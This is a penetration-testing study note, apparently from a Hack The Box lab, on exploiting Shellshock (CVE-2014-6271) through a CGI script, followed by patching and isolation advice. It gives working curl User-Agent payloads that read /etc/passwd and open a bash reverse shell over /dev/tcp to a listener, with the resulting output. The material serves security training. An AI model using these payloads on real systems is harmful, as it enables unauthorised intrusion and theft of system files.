## Attacking CGI Applications (Shellshock)
### 1. Overview: What is CGI?

Common Gateway Interface (CGI) is a standard protocol that allows web servers to execute scripts and programs to generate dynamic content.

- Primary Use: Middleware to connect web servers with external applications (e.g., DBs, scripts).    
- Common Usage:
    - Forms (e.g., feedback, email, registration)
    - Guest books, mailing lists, blogs        
- Script Location: Typically under `/cgi-bin/`
- Languages: C, C++, Perl, Java, Python, etc.
- Security Context: CGI scripts run in the web server’s user context (e.g., `www-data`)
#### CGI Workflow (High-Level Steps)

1. CGI scripts placed in `/cgi-bin/`
2. User sends request via URL like `https://example.com/cgi-bin/script.pl`
3. Server executes script and returns output to client
### 2. CGI Limitations

- Starts a new process per HTTP request – resource intensive
- No data caching
- New DB connection per request
- Generally inefficient and outdated
- Still found in legacy systems and embedded devices (e.g., IoT)
### 3. CGI Attacks – Shellshock (CVE-2014-6271)

#### Vulnerability Summary

- Found in Bash ≤ v4.3    
- Exploits the way Bash handles environment variables
- Allows remote command execution via malformed function definitions
#### Exploit Format (Bash)

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

- `y='() { :;}; ...'` is interpreted as a function    
- Bash executes any command after `;}` if vulnerable
#### Expected Outputs

- Vulnerable: prints `vulnerable-shellshock`    
- Patched: prints only `not vulnerable`
#### Security Impact

- Code is executed with the privileges of the web server
    - Usually `www-data`
    - Occasionally `root` (if server misconfigured)        
### 4. Shellshock via CGI – Hands-On
#### A. Enumeration (Gobuster)

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Output:

```
/access.cgi           (Status: 200)
```

Script `access.cgi` is discovered.
#### B. Basic Interaction (curl)

```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

Returns 200 OK but no content — script may be dormant but still vulnerable.
#### C. Confirming Shellshock Vulnerability

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
```

If vulnerable, server returns contents of `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```
#### D. Exploiting for Reverse Shell

1. Start a Netcat listener:

```bash
nc -lvnp 7777
```

2. Trigger the reverse shell:
   
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

Successful shell:

```
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
www-data@htb:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### 5. Mitigation and Remediation

- Patch Bash to a version > 4.3    
- On legacy systems:
    - Upgrade package manager if needed
    - If patching not feasible, restrict network access (firewall)
- For IoT or embedded:
    - Decommission if possible        
    - Isolate on internal network as a last resort
### 6. Final Thoughts

- Shellshock is old (2014) but still appears in legacy systems and IoT devices
- Always investigate CGI scripts (`/cgi-bin/`) during assessments
- A simple exploit path may yield an internal foothold
